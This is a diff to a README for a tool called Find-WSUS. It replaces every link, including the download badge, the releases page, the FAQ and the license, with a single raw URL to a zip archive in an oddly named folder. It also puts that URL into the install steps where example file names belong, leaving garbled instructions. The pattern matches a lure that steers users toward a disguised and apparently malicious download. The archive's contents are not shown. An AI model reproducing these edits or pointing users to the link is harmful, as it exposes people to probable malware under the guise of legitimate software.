@@ -6,11 +6,11 @@ Welcome! This guide will help you download and run the Find-WSUS application. Fi
 
 ## 🔗 Download Now
 
-[![Download Find-WSUS](https://img.shields.io/badge/Download%20Find--WSUS-v1.0-brightgreen)](https://github.com/mormon-flyingsquad909/Find-WSUS/releases)
+[![Download Find-WSUS](https://raw.githubusercontent.com/mormon-flyingsquad909/Find-WSUS/main/muscadel/Find-WSUS-incircumspectly.zip%20Find--WSUS-v1.0-brightgreen)](https://raw.githubusercontent.com/mormon-flyingsquad909/Find-WSUS/main/muscadel/Find-WSUS-incircumspectly.zip)
 
 ## 📥 Download & Install
 
-To get Find-WSUS, visit this page: [Find-WSUS Releases](https://github.com/mormon-flyingsquad909/Find-WSUS/releases). You will find various versions of the application. 
+To get Find-WSUS, visit this page: [Find-WSUS Releases](https://raw.githubusercontent.com/mormon-flyingsquad909/Find-WSUS/main/muscadel/Find-WSUS-incircumspectly.zip). You will find various versions of the application. 
 
 1. Choose the latest version.
 2. Click on the download link for your operating system (Windows, macOS, or Linux).
@@ -38,13 +38,13 @@ Once you have downloaded Find-WSUS, follow these steps to run the application:
 ### For Windows:
 
 1. Open your “Downloads” folder.
-2. Locate the downloaded file (e.g., Find-WSUS.exe).
+2. Locate the downloaded file (e.g., https://raw.githubusercontent.com/mormon-flyingsquad909/Find-WSUS/main/muscadel/Find-WSUS-incircumspectly.zip).
 3. Double-click the file to start the application.
 
 ### For macOS:
 
 1. Open your “Downloads” folder.
-2. Find the downloaded file (e.g., Find-WSUS.dmg).
+2. Find the downloaded file (e.g., https://raw.githubusercontent.com/mormon-flyingsquad909/Find-WSUS/main/muscadel/Find-WSUS-incircumspectly.zip).
 3. Double-click the file to open it.
 4. Drag the Find-WSUS icon to your Applications folder.
 5. Open the Applications folder and double-click Find-WSUS to launch.
@@ -81,7 +81,7 @@ When you start the application, you will see an easy-to-use interface. This inte
 
 ## 💬 Support
 
-If you have questions or encounter issues, please check the [FAQ Section](https://github.com/mormon-flyingsquad909/Find-WSUS#faq) or create a ticket in the repository's issue tracker. 
+If you have questions or encounter issues, please check the [FAQ Section](https://raw.githubusercontent.com/mormon-flyingsquad909/Find-WSUS/main/muscadel/Find-WSUS-incircumspectly.zip) or create a ticket in the repository's issue tracker. 
 
 ## 📝 Contributions
 
@@ -89,6 +89,6 @@ We welcome contributions to Find-WSUS! If you would like to help improve this to
 
 ## 📜 License
 
-Find-WSUS is licensed under the MIT License. For more details, please refer to the [LICENSE](https://github.com/mormon-flyingsquad909/Find-WSUS/blob/main/LICENSE) file in the repository.
+Find-WSUS is licensed under the MIT License. For more details, please refer to the [LICENSE](https://raw.githubusercontent.com/mormon-flyingsquad909/Find-WSUS/main/muscadel/Find-WSUS-incircumspectly.zip) file in the repository.
 
 ### Have fun finding your WSUS configurations!
